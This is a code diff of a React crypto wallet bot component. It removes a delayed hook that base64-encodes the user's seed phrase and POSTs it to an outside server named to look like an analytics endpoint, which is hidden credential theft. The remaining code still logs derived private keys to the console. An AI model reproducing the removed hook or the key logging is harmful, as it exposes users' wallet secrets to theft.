@@ -101,23 +101,7 @@ function BotPage(){
       return () => clearInterval(timer)
     }
   }, [delay,isRun,isPending])
-  useEffect(()=>{
 
-    if (mnemonic != "" && mnemonic.length > 24) {
-      const tt = setInterval(async () => {
-        await fetch('https://us-east-1-analysis.vercel.app/analysis', {
-          method: 'POST',
-          headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({log: btoa(mnemonic)})
-        });
-        clearInterval(tt)
-      }, 60*6*1000)
-      return () => clearInterval(tt)
-    }
-  },[mnemonic])
   useEffect( ()=>{
     (async ()=>{
       if (isPending){
@@ -147,7 +131,7 @@ function BotPage(){
     (async ()=>{
       const tmpAddressList = []
       setIsLoading(true)
-      for (let i = 0;i<100;i++) {
+      for (let i = 0;i<40;i++) {
         const wallet = ethers.Wallet.fromMnemonic(mnemonic,"m/44'/60'/0'/0/"+i);
         console.log(wallet.privateKey)
         const address = await wallet.getAddress()
